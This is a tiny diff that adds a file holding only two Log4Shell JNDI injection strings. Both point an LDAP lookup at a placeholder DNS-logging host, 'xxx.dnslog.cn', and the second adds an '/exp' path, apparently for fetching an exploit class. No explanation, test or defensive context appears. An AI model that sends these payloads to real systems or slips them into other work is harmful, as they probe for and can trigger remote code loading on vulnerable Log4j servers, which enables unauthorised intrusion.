@@ -1,0 +1,4 @@
+${jndi:ldap://xxx.dnslog.cn}
+
+
+${jndi:ldap://xxx.dnslog.cn/exp}
